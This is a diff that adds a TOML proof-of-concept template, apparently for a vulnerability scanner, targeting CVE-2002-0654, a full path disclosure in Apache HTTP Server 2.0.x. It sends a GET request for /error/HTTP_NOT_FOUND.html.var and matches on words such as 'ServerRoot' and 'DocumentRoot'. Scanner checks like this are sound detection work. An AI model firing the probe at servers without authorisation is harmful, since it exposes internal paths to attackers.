@@ -1,0 +1,30 @@
+[info]
+author = "AVE"
+description = "通过请求 Apache 2.0.x 服务器上的 .var 文件（如 HTTP_NOT_FOUND.html.var），触发 MIME 协商失败，服务器返回包含完整安装路径的错误信息，泄露物理路径。"
+id = "POC-AVE-2002-0009"
+name = "Apache HTTP Server 2.0 Full Path Disclosure PoC"
+severity = "medium"
+tags = ["ave-2002-0009"]
+vuln_id = [
+    "CVE-2002-0654",
+    "AVE-2002-0009",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/error/HTTP_NOT_FOUND.html.var"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    ':\',
+    "Apache",
+    "ServerRoot",
+    "DocumentRoot",
+]
